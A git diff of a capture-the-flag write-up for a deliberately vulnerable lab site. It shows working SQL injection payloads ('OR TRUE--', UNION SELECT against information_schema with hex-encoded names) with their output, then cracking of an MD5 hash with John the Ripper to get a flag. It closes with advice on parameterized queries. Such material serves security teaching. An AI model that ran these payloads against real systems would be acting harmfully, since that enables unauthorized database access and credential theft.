@@ -8,119 +8,103 @@ Title: Hack me ?
 Url : borntosec.ddns.net/images.png
 ```
 
-Since this input field looks very vulnerable to SQL injections, we try a single quote like in the [Members page](/sql_injection_members)
-
----
-
-First we try withsingle quote to see if an error comes back, as that would
-tell us if this search function is vulnerable for an sql injection.
-Sadly we get nothing back so some amount of sanitization is taking place.
-
-We'll try something else :
+Since this input field looks very vulnerable to SQL injections, we try a single quote like in the [Members](/sql_injection_members) page. It doesn't output anything, so we need to be more creative, with `42 OR TRUE--`:
 
 ```
-5 OR 1=1--
-```
-
-and the output is :
-
-```
-ID: 5 OR 1=1--
+ID: 5 OR TRUE--
 Title: Nsa
 Url : https://fr.wikipedia.org/wiki/Programme_
 
-ID: 5 OR 1=1--
+ID: 5 OR TRUE--
 Title: 42 !
 Url : https://fr.wikipedia.org/wiki/Fichier:42
 
-ID: 5 OR 1=1--
+ID: 5 OR TRUE--
 Title: Google
 Url : https://fr.wikipedia.org/wiki/Logo_de_Go
 
-ID: 5 OR 1=1--
+ID: 5 OR TRUE--
 Title: Earth
 Url : https://en.wikipedia.org/wiki/Earth#/med
 
-ID: 5 OR 1=1--
+ID: 5 OR TRUE--
 Title: Hack me ?
 Url : borntosec.ddns.net/images.png
 ```
 
-which means that it is vulnerable to sql injections !
+This doesn't give us anything new but it proves that the input field is vulnerable to SQL injections.
 
-Now we use another command to see what tables we have access to
+Now we use another command to see what tables we have access to:
 
 ```
-ID: -1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=DATABASE()--
+ID: 42 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=DATABASE()--
 Title: list_images
 Url :
 ```
 
-We can access the values in list_images, as expected.
-So now we do list the values :
+We now explore `list_images`, by encoding the column name in hexa:
 
 ```
-ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
+ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
 Title: id
 Url :
 
-ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
+ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
 Title: url
 Url :
 
-ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
+ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
 Title: title
 Url :
 
-ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
+ID: 42 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
 Title: comment
 Url :
 ```
 
-There is a comment, which is a hidden field normally for the user.
-Fecthing the values for the comment gives us :
+There is a comment field which we didn't know about. Fetching its values gives us:
 
 ```
-ID: 6 UNION SELECT title, comment FROM list_images--
+ID: 42 UNION SELECT title, comment FROM list_images--
 Title: An image about the NSA !
 Url : Nsa
 
-ID: 6 UNION SELECT title, comment FROM list_images--
+ID: 42 UNION SELECT title, comment FROM list_images--
 Title: There is a number..
 Url : 42 !
 
-ID: 6 UNION SELECT title, comment FROM list_images--
+ID: 42 UNION SELECT title, comment FROM list_images--
 Title: Google it !
 Url : Google
 
-ID: 6 UNION SELECT title, comment FROM list_images--
+ID: 42 UNION SELECT title, comment FROM list_images--
 Title: Earth!
 Url : Earth
 
-ID: 6 UNION SELECT title, comment FROM list_images--
+ID: 42 UNION SELECT title, comment FROM list_images--
 Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
 Url : Hack me ?
 ```
 
-And we found the flag. Now we just need to decode it using John the Ripper.
+We just need to follow the instructions:
 
-```
-darklyProject git:(master) ✗ ../john/run/john --format=Raw-MD5 comment
+```console
+$ john --format=Raw-MD5 sql_injection_images/resources/comment
 Using default input encoding: UTF-8
-Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
 Warning: no OpenMP support for this hash type, consider --fork=20
-Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
 Proceeding with single, rules:Single
-Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
-Warning: Only 22 candidates buffered for the current salt, minimum 24 needed for performance.
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
 Almost done: Processing the remaining buffered candidate passwords, if any.
-0g 0:00:00:00 DONE 1/3 (2024-11-26 19:24) 0g/s 8564p/s 8564c/s 8564C/s Getflag1905..Getflag1900
-Proceeding with wordlist:../john/run/password.lst
+0g 0:00:00:00 DONE 1/3 (2025-05-24 15:16) 0g/s 50750p/s 50750c/s 50750C/s Comment1909..Comment1900
+Proceeding with wordlist:/tmp/tmpv8957wdu/password.lst
 Enabling duplicate candidate password suppressor
-albatroz         (GetFlag)
-1g 0:00:00:00 DONE 2/3 (2024-11-26 19:24) 2.703g/s 645318p/s 645318c/s 645318C/s billy420..sylveste
+albatroz         (comment)
+1g 0:00:00:00 DONE 2/3 (2025-05-24 15:16) 9.090g/s 2164Kp/s 2164Kc/s 2164KC/s billy420..Thanks
 Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
 Session completed.
+$ echo -n albatroz | sha256sum
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188  -
 ```
 
-albatroz to sha256 gives us : F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188
+To defend against SQL injections, use parameterized queries (also known as prepared statements) everywhere so the driver, not your code, handles quoting and type-checking. Escaping tricks like replacing quotes only give a false sense of security—an attacker will just switch to `0x`, `CHAR()` or similar tricks.
